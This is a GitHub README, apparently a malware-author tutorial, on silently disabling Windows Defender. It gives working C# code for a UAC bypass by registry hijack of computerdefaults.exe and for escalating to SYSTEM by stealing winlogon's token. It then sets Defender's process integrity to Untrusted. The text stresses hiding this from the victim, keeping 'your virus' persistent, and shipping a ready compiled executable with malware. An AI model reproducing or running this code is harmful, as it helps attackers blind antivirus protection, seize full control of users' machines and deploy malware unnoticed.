# Disable-Windows-Defender-
Disable Windows Defender (+ UAC Bypass, + Upgrade to SYSTEM)

<h2 align="center"></h2>
<img src="https://github.com/EvilGreys/Disable-Windows-Defender-/blob/main/imge/4.png" 
<p align="center">

<h4 align="center">CHAPTER 1: PREPARATION</h4>
<p align="center">

Let's start, as expected, with a tedious theory. Unfortunately, without it, the essence of what is happening in the future will not be clear, so I will try to tell you as briefly as possible and in an understandable language.

Privilege tokens are permissions given by the system to a process.
For example, if a process has a "SeShutdownPrivilege" token, then it has the right to turn off your computer.​
If your program does not have this token, it will not be able to perform this action.

Windows Defender uses its privileges to check files. For example, “SeRestorePlivilege".​
From this, we conclude that if you deprive the antivirus process of permission to check files, it will become useless and will not be able to perform this very check.​
​
Any explanation will become clearer if you translate it from dry text into visualization.
Actually, for this reason, I suggest you download Process Hacker and look with your own eyes at the tokens available to a particular process.

Windows Defender is responsible for the process MsMpEng.exe we need to find it in the list and open the Tokens tab​
​
Here we notice that the process has many different privileges that are of key importance to it.

As you understand, we will deal with disabling these privileges.​
This concludes the theoretical part, and we begin to implement the POC.

At the very start, we are already plagued by two problems.

- The process MsMpEng.exe launched on behalf of the System. To edit its tokens, we need to have the user “NT AUTHORITY\SYSTEM”​
- To get a SYSTEM, we will need to upgrade, which in turn occurs only from the administrator level.

<h2 align="center"></h2>
<img src="https://github.com/EvilGreys/Disable-Windows-Defender-/blob/main/imge/1.png" 
<p align="center">

### we will have to restart the process as many as 2 times to get all the necessary rights.

- We get administrator rights using UAC Bypass.
- And then we get the SYSTEM level by stealing the token and starting our process with the stolen token.

Well, let's start creating it.

<h4 align="center">CHAPTER 2: RAISING THE RIGHTS</h4>
<p align="center">

### There are a lot of UAC bypass implementations, you can choose any one that suits you. In this article, I will use the most common method through registry editing.

Its essence is that the system application computerdefaults.exe , at startup, accesses regedit , in the path "Software\Classes\ms-settings\shell\open\command". Our task is to edit this item on your application.
Now at startup computerdefaults.exe our application opens, but with administrator rights. Edit the registry and add the application launch via cmd.

```
string execPath = Assembly.GetEntryAssembly().Location;

            Registry.CurrentUser.CreateSubKey("Software\\Classes\\ms-settings\\shell\\open\\command");
            Registry.CurrentUser.CreateSubKey("Software\\Classes\\ms-settings\\shell\\open\\command").SetValue("", execPath, RegistryValueKind.String);
            Registry.CurrentUser.CreateSubKey("Software\\Classes\\ms-settings\\shell\\open\\command").SetValue("DelegateExecute", 0, RegistryValueKind.DWord);
            Registry.CurrentUser.Close();


            Process process = new System.Diagnostics.Process();
            ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
            startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
            startInfo.FileName = "cmd.exe";
            startInfo.Arguments = @"/C computerdefaults.exe";
            process.StartInfo = startInfo;
            process.Start();
```

Actually, at this stage we have already started our process on behalf of the administrator, without any warnings or icons on the icon.

<h4 align="center">CHAPTER 2.1: I AM THE SYSTEM</h4>
<p align="center">

As already mentioned, the Windows Defender process is running on behalf of NT AUTHORITY\SYSTEM. ​

We, being a normal process, cannot edit a process running on behalf of the system.​
​
We need a raise!

We will crank it through a duplicate token winlogon.exe​
Pay attention to the picture, here is the full algorithm of action.

If you explain what happened in a nutshell:
Windows has a process like winlogon, it runs with the system and is responsible for user authorization. We will duplicate the token of this process and run our own program with the stolen token.

<h2 align="center"></h2>
<img src="https://github.com/EvilGreys/Disable-Windows-Defender-/blob/main/imge/2.png" 
<p align="center">

- OpenProcessToken() -- Open the process token with the TOKEN_DUPLICATE access level (we get the token handle at the output)
- STARTUPINFO -- Set the parameters for starting the process
- DuplicateTokenEx() -- Duplicate the token with winlogon and write it down
- CreateProcessWithTokenW() -- Starting our process .exe with a token stolen from winlogon
- Congratulations, you are great

```
string procTostart = Assembly.GetEntryAssembly().Location;
            Process process = Process.GetProcessesByName("winlogon")[0];
            IntPtr procHandle = process.Handle;
            IntPtr tokenHandle = IntPtr.Zero;

            WinApi.OpenProcessToken(procHandle, 0x0002, out tokenHandle);

            WinApi.STARTUPINFO SINFO = new WinApi.STARTUPINFO();
            SINFO.dwFlags = 1;
            SINFO.wShowWindow = 1;

            WinApi.PROCESS_INFORMATION PINFO;

            WinApi.SECURITY_ATTRIBUTES SECA = new WinApi.SECURITY_ATTRIBUTES();

            IntPtr doubleDuplicateToken = IntPtr.Zero;

            WinApi.DuplicateTokenEx(tokenHandle, 0x2000000, ref SECA, 2, WinApi.TOKEN_TYPE.TokenPrimary, out doubleDuplicateToken);

            WinApi.CreateProcessWithTokenW(doubleDuplicateToken, WinApi.LogonFlags.NetCredentialsOnly, null, procTostart, WinApi.CreationFlags.DefaultErrorMode, IntPtr.Zero, null, ref SINFO, out PINFO);
```

### Let's make an interim result:

We forced our program to run on behalf of SYSTEM, bypassing UAC at the same time.

Let's see what happened in the real test.



https://github.com/EvilGreys/Disable-Windows-Defender-/assets/143311596/fff14f04-6d09-438b-a29a-c1d065cd77b9


Actually, as you can see in the demonstration, the initial process is started without administrator rights.

- Then, a UAC bypass is applied and a second process with elevated rights is opened
- The second process, in turn, launches the last .exe, which has both administrator rights and is run on behalf of the system.

At this point, we have fulfilled all the conditions for editing the privileges of the system process and are ready to implement disabling Windows Defender.

<h4 align="center">CHAPTER 3: DISABLING THE ANTIVIRUS</h4>
<p align="center">

Let's go back to the theoretical chapter of the article for a second and remember why we actually made all these upgrades.
Our task is to deprive the antivirus process of privileges, thanks to which it can check files for malware.​
​
There are two ways to solve this problem: Remove the entire list of privileges manually. Or set the Integrity Level to “Untrusted”.

During the tests, it was found that both of these solutions are interchangeable and will lead to the same result.​
​
Therefore” we will take the path of less resistance and set the Integrity Level “Untrusted".

### Like you in the previous steps, we will use the diagram to explain the next steps.

Actually, the algorithm of actions is as follows :

- OpenProcess() – get the handle of the process with access to “QueryLimitedInformation”
- OpenProcessToken() – Open the process token with the access level
- TOKEN_ALL_ACCESS TOKEN_MANDATORY_LABEL – fill in the structure that we will install in the process token
- ConvertStringSidToSid() – get the SID of the “ML_UNTRUSTED” parameter
- StructureToPtr() – we bring the structure into the format necessary for work
- SetTokenInformation() – Setting the “Untrusted” trust level on our process.

<h2 align="center"></h2>
<img src="https://github.com/EvilGreys/Disable-Windows-Defender-/blob/main/imge/3.png" 
<p align="center">

The SID value of ”ML_UNTRUSTED" can be found in the Microsoft documentation, at the link.

https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dtyp/81d92bba-d22b-4a8c-908a-554ab29148ab

Actually, this is the end of all the actions that we needed to do to remove privileges from the process.

The version of Windows Defender used is the most current at the time of writing.

<h4 align="center">results :</h4>
<p align="center">

So, let's ask ourselves the rhetorical question “What the fuck did I do that for?"

- The method of deleting WD via a script is dead. The method I presented in this article can currently be implemented without defects (!!!)
- This method does not cut the Antivirus from the system, it simply prohibits it from performing its functions. The user will not be suspicious of a sudden notification from the system about a disabled antivirus.
- The user will not see any icons on the panel. There will be no changes for him, he will not even suspect the fact that his system has been left unprotected.
- A similar trick can be tried with other Antiviruses, in the article Defender is taken as the most common.

The disadvantages of this idea:

- We need Administrator rights (as well as for other methods, but come on).
If the user has them, we work around this problem through the UAC Bypass
- Privilege tokens are re-issued to the process after the system is restarted. Therefore, if your virus remains in the system for a long time, add disabling WD to the startup

After carefully rereading the entire list of pros and cons, I come to the conclusion that this method has every chance of being used in combat.

Its main advantage is that the method is not burned by the Defender itself and will not be demolished when it hits the system.

- Disable WD.zip archive with C sources#
- Silent.a zip archive containing an already compiled .exe file that you can upload along with your virus.
It is completely invisible, runs without a console and disappears from the task manager.

In Silent.exe UAC bypass is not used, so you need to run it as an administrator.

### THE NOTE
This article is for informational purposes only. We do not encourage you to commit any hacking. Everything you do is your responsibility.

TOX : 340EF1DCEEC5B395B9B45963F945C00238ADDEAC87C117F64F46206911474C61981D96420B72 Telegram : @DevSecAS


